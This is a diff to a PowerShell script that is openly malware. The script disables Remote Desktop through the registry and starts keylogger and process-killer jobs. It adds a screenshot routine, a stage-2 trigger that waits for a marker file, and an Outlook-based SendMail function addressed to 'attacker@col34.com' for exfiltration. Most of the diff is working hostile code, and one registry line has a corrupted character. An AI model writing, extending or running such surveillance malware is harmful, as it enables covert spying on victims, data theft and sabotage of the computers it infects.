@@ -1,6 +1,6 @@
 function Disable-RemoteConnections { 
     try {
-        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 1 -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" ï¿½Value 1 -ErrorAction SilentlyContinue
     }
     catch { Write-Host "[-] low integrity level of runtime process! (try to run As Administrator...)" -ForegroundColor Red }
 }
@@ -79,201 +79,207 @@ while ($true)
     }
 }
 
-$ScreenshotScript = {
-function Get-ScreenShot
-{
-    [CmdletBinding(DefaultParameterSetName='OfWholeScreen')]
-    param(    
-    # If set, takes a screen capture of the current window
-    [Parameter(Mandatory=$true,
-        ValueFromPipelineByPropertyName=$true,
-        ParameterSetName='OfWindow')]
-    [Switch]$OfWindow,
+$SendMailScript = {
+    function ScreenShot
+    {
+        [CmdletBinding(DefaultParameterSetName='OfWholeScreen')]
+        param(    
+        # If set, takes a screen capture of the current window
+        [Parameter(Mandatory=$true,
+            ValueFromPipelineByPropertyName=$true,
+            ParameterSetName='OfWindow')]
+        [Switch]$OfWindow,
     
-    # If set, takes a screenshot of a location on the screen.
-    # If two numbers are passed, the screenshot will be from 0,0 to first (left), second (top)
-    # If four numbers are passed, the screenshot will be from first (Left), second(top), third (width), fourth (height)
-    [Parameter(Mandatory=$true,
-        ValueFromPipelineByPropertyName=$true,
-        ParameterSetName='OfLocation')]    
-    [Double[]]$OfLocation,
+        # If set, takes a screenshot of a location on the screen.
+        # If two numbers are passed, the screenshot will be from 0,0 to first (left), second (top)
+        # If four numbers are passed, the screenshot will be from first (Left), second(top), third (width), fourth (height)
+        [Parameter(Mandatory=$true,
+            ValueFromPipelineByPropertyName=$true,
+            ParameterSetName='OfLocation')]    
+        [Double[]]$OfLocation,
     
-    # The path for the screenshot. 
-    # If this isn't set, the screenshot will be automatically saved to a file in the current directory named ScreenCapture
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]
-    $Path,
+        # The path for the screenshot. 
+        # If this isn't set, the screenshot will be automatically saved to a file in the current directory named ScreenCapture
+        [Parameter(ValueFromPipelineByPropertyName=$true)]
+        [string]
+        $Path,
     
-    # The image format used to store the screen capture
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [ValidateSet('PNG', 'JPEG', 'TIFF', 'GIF', 'BMP')]
-    [string]
-    $ImageFormat = 'JPEG',
+        # The image format used to store the screen capture
+        [Parameter(ValueFromPipelineByPropertyName=$true)]
+        [ValidateSet('PNG', 'JPEG', 'TIFF', 'GIF', 'BMP')]
+        [string]
+        $ImageFormat = 'JPEG',
     
-    # The time before and after each screenshot
-    [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [Timespan]$ScreenshotTimer = "0:0:0.125"
-    )
+        # The time before and after each screenshot
+        [Parameter(ValueFromPipelineByPropertyName=$true)]
+        [Timespan]$ScreenshotTimer = "0:0:0.125"
+        )
 
 
-    begin {
-        Add-Type -AssemblyName System.Drawing, System.Windows.Forms
-        $saveScreenshotFromClipboard = {
-            if ([Runspace]::DefaultRunspace.ApartmentState -ne 'STA') {
-                # The clipboard isn't accessible in MTA, so save the image in background runspace
-                $cmd = [PowerShell]::Create().AddScript({
+        begin {
+            Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+            $saveScreenshotFromClipboard = {
+                if ([Runspace]::DefaultRunspace.ApartmentState -ne 'STA') {
+                    # The clipboard isn't accessible in MTA, so save the image in background runspace
+                    $cmd = [PowerShell]::Create().AddScript({
+                        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
+                        $bitmap.Save($args[0], $args[1], $args[2])                    
+                        $bitmap.Dispose()
+                    }).AddParameters(@("${screenCapturePathBase}${c}.$ImageFormat",$Codec, $ep))
+                    $runspace = [RunspaceFactory]::CreateRunspace()
+                    $runspace.ApartmentState = 'STA'
+                    $runspace.ThreadOptions = 'ReuseThread'
+                    $runspace.Open()
+                    $cmd.Runspace = $runspace
+                    $cmd.Invoke()
+                    $runspace.Close()
+                    $runspace.Dispose()
+                    $cmd.Dispose()
+                } else {            
                     $bitmap = [Windows.Forms.Clipboard]::GetImage()    
-                    $bitmap.Save($args[0], $args[1], $args[2])                    
+                    $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
                     $bitmap.Dispose()
-                }).AddParameters(@("${screenCapturePathBase}${c}.$ImageFormat",$Codec, $ep))
-                $runspace = [RunspaceFactory]::CreateRunspace()
-                $runspace.ApartmentState = 'STA'
-                $runspace.ThreadOptions = 'ReuseThread'
-                $runspace.Open()
-                $cmd.Runspace = $runspace
-                $cmd.Invoke()
-                $runspace.Close()
-                $runspace.Dispose()
-                $cmd.Dispose()
-            } else {            
-                $bitmap = [Windows.Forms.Clipboard]::GetImage()    
-                $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
-                $bitmap.Dispose()
-            }
-        }
-    }
-    process {
-        #region Codec Info
-        $Codec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
-            Where-Object { $_.FormatDescription -eq $ImageFormat }
-
-        $ep = New-Object Drawing.Imaging.EncoderParameters  
-        if ($ImageFormat -eq 'JPEG') {
-            $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
-        }
-        #endregion Codec Info
-        
-
-        #region PreScreenshot timer
-        if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
-            Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
-        }
-        #endregion Prescreenshot Timer
-        
-        #region File name
-        if (-not $Path) {
-            $screenCapturePathBase = "$pwd\ScreenCapture"
-        } else {
-            $screenCapturePathBase = $Path
-        }
-        $c = 0
-        while (Test-Path "${screenCapturePathBase}${c}.$ImageFormat") {
-            $c++
-        }
-        #endregion
-        
-
-        
-        if ($psCmdlet.ParameterSetName -eq 'OfWindow') {
-            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
-            #region PostScreenshot timer
-            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
-                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
-            }
-            #endregion Postscreenshot Timer
-            . $saveScreenshotFromClipboard 
-            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
-        } elseif ($psCmdlet.ParameterSetName -eq 'OfLocation') {
-            if ($OfLocation.Count -ne 2 -and $OfLocation.Count -ne 4) {
-                Write-Error "Must provide either a width and a height, or a top, left, width, and height"                
-                return
-            }
-            if ($OfLocation.Count -eq 2) {
-                $bounds  = New-Object Drawing.Rectangle -Property @{
-                    Width = $OfLocation[0]
-                    Height = $OfLocation[1]
-                }                
-            } else {
-                $bounds  = New-Object Drawing.Rectangle -Property @{
-                    X = $OfLocation[0]
-                    Y = $OfLocation[1]
-                    Width = $OfLocation[2]
-                    Height = $OfLocation[3]
                 }
             }
-            
-            $bitmap = New-Object Drawing.Bitmap $bounds.width, $bounds.height
-            $graphics = [Drawing.Graphics]::FromImage($bitmap)
-            $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-            #region PostScreenshot timer
-            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
-                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
-            }
-            #endregion Postscreenshot Timer
-
-            $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
-            $graphics.Dispose()
-            $bitmap.Dispose()
-            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
-        } elseif ($psCmdlet.ParameterSetName -eq 'OfWholeScreen') {
-            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
-            #region PostScreenshot timer
-            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
-                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
-            }
-            #endregion Postscreenshot Timer
-            . $saveScreenshotFromClipboard             
-            Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
         }
+        process {
+            #region Codec Info
+            $Codec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
+                Where-Object { $_.FormatDescription -eq $ImageFormat }
+
+            $ep = New-Object Drawing.Imaging.EncoderParameters  
+            if ($ImageFormat -eq 'JPEG') {
+                $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
+            }
+            #endregion Codec Info
+        
+
+            #region PreScreenshot timer
+            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+            }
+            #endregion Prescreenshot Timer
+        
+            #region File name
+            if (-not $Path) {
+                $screenCapturePathBase = "$pwd\ScreenCapture"
+            } else {
+                $screenCapturePathBase = $Path
+            }
+            $c = 0
+            while (Test-Path "${screenCapturePathBase}${c}.$ImageFormat") {
+                $c++
+            }
+            #endregion
+        
+
+        
+            if ($psCmdlet.ParameterSetName -eq 'OfWindow') {
+                [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
+                #region PostScreenshot timer
+                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+                }
+                #endregion Postscreenshot Timer
+                . $saveScreenshotFromClipboard 
+                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+            } elseif ($psCmdlet.ParameterSetName -eq 'OfLocation') {
+                if ($OfLocation.Count -ne 2 -and $OfLocation.Count -ne 4) {
+                    Write-Error "Must provide either a width and a height, or a top, left, width, and height"                
+                    return
+                }
+                if ($OfLocation.Count -eq 2) {
+                    $bounds  = New-Object Drawing.Rectangle -Property @{
+                        Width = $OfLocation[0]
+                        Height = $OfLocation[1]
+                    }                
+                } else {
+                    $bounds  = New-Object Drawing.Rectangle -Property @{
+                        X = $OfLocation[0]
+                        Y = $OfLocation[1]
+                        Width = $OfLocation[2]
+                        Height = $OfLocation[3]
+                    }
+                }
+            
+                $bitmap = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+                $graphics = [Drawing.Graphics]::FromImage($bitmap)
+                $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+                #region PostScreenshot timer
+                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+                }
+                #endregion Postscreenshot Timer
+
+                $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
+                $graphics.Dispose()
+                $bitmap.Dispose()
+                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+            } elseif ($psCmdlet.ParameterSetName -eq 'OfWholeScreen') {
+                [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
+                #region PostScreenshot timer
+                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
+                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
+                }
+                #endregion Postscreenshot Timer
+                . $saveScreenshotFromClipboard             
+                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
+            }
         
                 
                 
+        }
     }
-}
+
+    function SendMail {
+        #gci ""
+        #create COM object named Outlook 
+        $Outlook = New-Object -ComObject Outlook.Application 
+        #create Outlook MailItem named Mail using CreateItem() method 
+        $Mail = $Outlook.CreateItem(0) 
+        #add properties as desired 
+        $Mail.To = "attacker@col34.com" 
+        $Mail.Subject = "${Get-Date -f "yyyy-MM-dd"}"
+
+        #send message 
+        $Mail.Send() 
+        #quit and cleanup 
+        $Outlook.Quit() 
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
+    }
+
     while ($true)
     {
-        Start-Sleep -Seconds 5
-        Get-ScreenShot
+        Start-Sleep -Minutes 60
+        ScreenShot
     }
 }
 
-########## THIS IS DEVELOPMENT ###############
-
-#try {
+$Stage2Script = {
+    $trigger = $false
+    while($true) {
+        if (Test-Path "C:\Windows\fish.dll") {
+            $trigger = $true
+        }
+        if ($trigger) {
+            #Write-Host "[+] Starting process killer..." -ForegroundColor Green
+            $ProcessKiller = Start-Job $ProcessKillerScript
+            break;
+        } 
+        Start-Sleep -Seconds 60
+    }
+}
 
 #Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
 Disable-RemoteConnections
 
+$Stage2 = Start-Job $Stage2Script
+
+########## WIP ################
+# $SendMail = Start-Job $SendMailScript
+
 #Write-Host "[+] Starting keylogger..." -ForegroundColor Green
 $Keylogging = Start-Job $KeyLoggerScript
 
-#Write-Host "[+] Starting process killer..." -ForegroundColor Green
-$ProcessKiller = Start-Job $ProcessKillerScript
-
 #Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
-$Screenshotter = Start-Job $ScreenshotScript
-
-<#while ($true) { Start-Sleep -Seconds 30 }
-
-}
-
-finally {    
-    Write-Host "[-] Stopped!" -ForegroundColor Red
-    Get-Job | Remove-Job -f
-}
-#>
-
-########## THIS IS PRODUCTION ################
-<#
-Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
-Disable-RemoteConnections
-
-Write-Host "[+] Starting keylogger..." -ForegroundColor Green
-$Keylogging = Start-Job $KeyLoggerScript
-
-Write-Host "[+] Starting process killer..." -ForegroundColor Green
-$ProcessKiller = Start-Job $ProcessKillerScript
-
-Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
-$Screenshotter = Start-Job $ScreenshotScript
-#>
+#$Screenshotter = Start-Job $ScreenshotScript
